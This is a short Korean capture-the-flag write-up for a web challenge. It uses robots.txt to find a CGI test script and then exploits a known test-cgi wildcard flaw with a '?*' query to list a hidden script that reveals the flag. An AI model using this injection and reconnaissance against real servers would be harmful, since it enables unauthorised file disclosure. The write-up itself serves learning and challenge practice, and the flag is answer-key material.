## Sprinkler System - 100

### Description

> Damn new york... some chick tricked you into standing in the rain on the very first day... it's payback time!

> http://sprinklers.alieni.se/

### Write up

> UNAUTHORIZED ACCESS WILL BE PROSECUTED

라는 메세지가 적힌 페이지가 보인다.

소스를 살펴봐도 별 특별한 것이 없다.

서버의 다른 파일을 찾기 위해 `robots.txt`를 살펴보자.

> http://sprinklers.alieni.se/robots.txt

```
User-agent: *
Disallow: /cgi-bin/test-cgi
```

`test-cgi` 라는 파일의 존재를 확인할 수 있다.

> http://sprinklers.alieni.se/cgi-bin/test-cgi

```
CGI/1.0 test script report:

argc is 0. argv is .

SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)
SERVER_NAME = sprinklers.alieni.se
GATEWAY_INTERFACE = CGI/1.1
SERVER_PROTOCOL = HTTP/1.1
SERVER_PORT = 80
REQUEST_METHOD = GET
HTTP_ACCEPT = text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
PATH_INFO =
PATH_TRANSLATED =
SCRIPT_NAME = /cgi-bin/test-cgi
QUERY_STRING =
REMOTE_HOST =
REMOTE_ADDR = 162.158.59.91
REMOTE_USER =
AUTH_TYPE =
CONTENT_TYPE =
CONTENT_LENGTH =
```

뭔가 여러 메세지가 나온다.

argc, argv라는 단어가 있는 것을 보면 유저가 인풋을 넣어줄 수 있을 것 같다.

> http://sprinklers.alieni.se/cgi-bin/test-cgi?ASDFASDF

```
QUERY_STRING = ASDFASDF
````

적당한 파라미터를 주면, `QUERY_STRING`의 값이 바뀌는 것을 확인할 수 있다.

그러다 어떤 식으로 인풋을 넣어줘야 할까 검색을 하다보니, 디렉토리 리스팅이 가능하다는 [test-cgi 취약점 ](http://insecure.org/sploits/test-cgi.html) 글을 발견했다.

와일드카드 문자가 명령어로 들어가는 모양.

따라서 인풋으로 `*`을 넣어주면

> http://sprinklers.alieni.se/cgi-bin/test-cgi?*

```
QUERY_STRING = enable_sprinkler_system test-cgi
```

현재 디렉토리의 파일 목록을 볼 수 있다.

test-cgi 외에 `enable_sprinkler_system`이라는 파일이 있다는 것을 확인할 수 있고,

> http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system

로 접속하면 플래그를 확인할 수 있다.


> SECT{-p00l_On_t3h_r00f_must_h@v3_A_l3ak!-}
